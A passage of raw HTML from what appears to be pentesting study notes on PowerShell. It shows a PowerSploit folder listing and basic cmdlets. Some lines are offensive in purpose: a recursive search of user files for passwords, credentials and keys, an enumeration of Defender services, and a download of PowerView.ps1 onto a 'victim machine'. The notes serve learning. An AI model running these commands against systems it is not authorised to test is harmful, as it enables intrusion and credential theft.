&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d----            &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; AM                Recon
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d----            &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; AM                ScriptModification
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d----            &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; AM                Tests
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-a---            &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; AM           &lt;span style=&#34;color:#ae81ff&#34;&gt;2852&lt;/span&gt; .gitignore
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-a---            &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; AM           &lt;span style=&#34;color:#ae81ff&#34;&gt;1590&lt;/span&gt; LICENSE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-a---            &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; AM           &lt;span style=&#34;color:#ae81ff&#34;&gt;8652&lt;/span&gt; mkdocs.yml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-a---            &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; AM           &lt;span style=&#34;color:#ae81ff&#34;&gt;5452&lt;/span&gt; PowerSploit.psd1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-a---            &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; AM            &lt;span style=&#34;color:#ae81ff&#34;&gt;150&lt;/span&gt; PowerSploit.psm1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-a---            &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; AM          &lt;span style=&#34;color:#ae81ff&#34;&gt;15855&lt;/span&gt; PowerSploit.pssproj
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-a---            &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; AM            &lt;span style=&#34;color:#ae81ff&#34;&gt;993&lt;/span&gt; PowerSploit.sln
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-a---            &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; AM          &lt;span style=&#34;color:#ae81ff&#34;&gt;10491&lt;/span&gt; README.md&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Install-Module .\Powersploit.psd1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Getting help for commands with examples&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-Help &amp;lt;PS-module&amp;gt; -Examples&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Creating new Directory or File&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;New-Item -Name &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Folder&amp;#34;&lt;/span&gt; -Type Directory
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;New-Item -Name &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;file.txt&amp;#34;&lt;/span&gt; -Type File&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Adding contents to a file&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Add-Content file.txt &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;First line
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Second Line
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Third line&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Renaming folders/files at once&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-ChildItem -path *.txt | Rename-Item -NewName {$_.name &lt;span style=&#34;color:#f92672&#34;&gt;-replace&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.txt&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.md&amp;#34;&lt;/span&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;after the dot in &lt;code&gt;$_.&lt;/code&gt; comes the property name like &lt;code&gt;Name&lt;/code&gt;, &lt;code&gt;Status&lt;/code&gt; etc.&lt;/p&gt;
&lt;p&gt;Filtering PowerShell object output. In this example I&amp;rsquo;m getting all local users, displaying their name, last login date, if password is required or not and sorting them alphabetically with their names&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-LocalUser * | Select-Object -Property Name,LastLogon,PasswordRequired,Enabled | Sort-Object Name&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;all of the above is possible because PowerShell is made up of objects.&lt;/p&gt;
&lt;p&gt;Getting service based on string search&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-Service | where DisplayName &lt;span style=&#34;color:#f92672&#34;&gt;-like&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*defend*&amp;#34;&lt;/span&gt; | select-object -Property *&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;like&lt;/li&gt;
&lt;li&gt;contains&lt;/li&gt;
&lt;li&gt;equal&lt;/li&gt;
&lt;li&gt;match&lt;/li&gt;
&lt;li&gt;not&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The results of above command show every service associated with Windows Defender and their properties.&lt;/p&gt;
&lt;p&gt;Getting count of unique items of whatever.&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-Process | sort |  uniq | Measure-Object | select -Property Count | fl&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt; Pipeline operator ensures that if current operation succeeds it then runs next command &lt;code&gt;||&lt;/code&gt; Pipeline operator ensures that if current operation doesn&amp;rsquo;t run the next one will run &lt;code&gt;|&lt;/code&gt; Pipeline operator runs whether or not previous command fails&lt;/p&gt;
&lt;p&gt;Searching for specific file in a directory&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-ChildItem -Path D:\ &lt;span style=&#34;color:#f92672&#34;&gt;-File&lt;/span&gt; -Recurse | where {$_.name &lt;span style=&#34;color:#f92672&#34;&gt;-like&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*.txt&amp;#34;&lt;/span&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;searching for sensitive strings in files&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-ChildItem -Path C:\Users\ -Filter &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*.txt&amp;#34;&lt;/span&gt; -Recurse &lt;span style=&#34;color:#f92672&#34;&gt;-File&lt;/span&gt; | sls &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Password&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;credential&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;key&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Get Properties and methods of an object&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-LocalUser administrator | get-member&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Getting structured contents of a website and what can be retrieved from the website&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Invoke-WebRequest -Uri &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://www.hackthebox.com/&amp;#34;&lt;/span&gt; -Method GET | Get-Member
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   TypeName&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; Microsoft.PowerShell.Commands.BasicHtmlWebResponseObject
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Name              MemberType Definition
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;----              ---------- ----------
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Equals            Method     bool Equals(System.Object obj)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GetHashCode       Method     int GetHashCode()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GetType           Method     type GetType()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ToString          Method     string ToString()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BaseResponse      Property   System.Net.Http.HttpResponseMessage BaseResponse {get;set;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content           Property   string Content {get;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Encoding          Property   System.Text.Encoding Encoding {get;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Headers           Property   System.Collections.Generic.Dictionary[string,System.Collections.Generic.IEnumerable[strin&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Images            Property   Microsoft.PowerShell.Commands.WebCmdletElementCollection Images {get;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;InputFields       Property   Microsoft.PowerShell.Commands.WebCmdletElementCollection InputFields {get;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Links             Property   Microsoft.PowerShell.Commands.WebCmdletElementCollection Links {get;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RawContent        Property   string RawContent {get;set;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RawContentLength  Property   long RawContentLength {get;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RawContentStream  Property   System.IO.MemoryStream RawContentStream {get;set;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RelationLink      Property   System.Collections.Generic.Dictionary[&lt;span style=&#34;color:#66d9ef&#34;&gt;string,string&lt;/span&gt;] RelationLink {get;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;StatusCode        Property   int StatusCode {get;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;StatusDescription Property   string StatusDescription {get;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Filtering element details from website&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Invoke-WebRequest -Uri &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://www.hackthebox.com/&amp;#34;&lt;/span&gt; -Method GET | fl StatusCode&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Downloading a file&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Invoke-WebRequest -Uri &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1&amp;#34;&lt;/span&gt; -OutFile &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\PowerView.ps1&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt; If we already had &lt;code&gt;PowerView.ps1&lt;/code&gt; stored on our &lt;code&gt;attack host&lt;/code&gt; we could use a simple python web server to host PowerView.ps1 and download it from the target.&lt;/p&gt;
&lt;p&gt;In case &lt;code&gt;Invoke-WebRequest&lt;/code&gt; method is restricted on victim machine&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


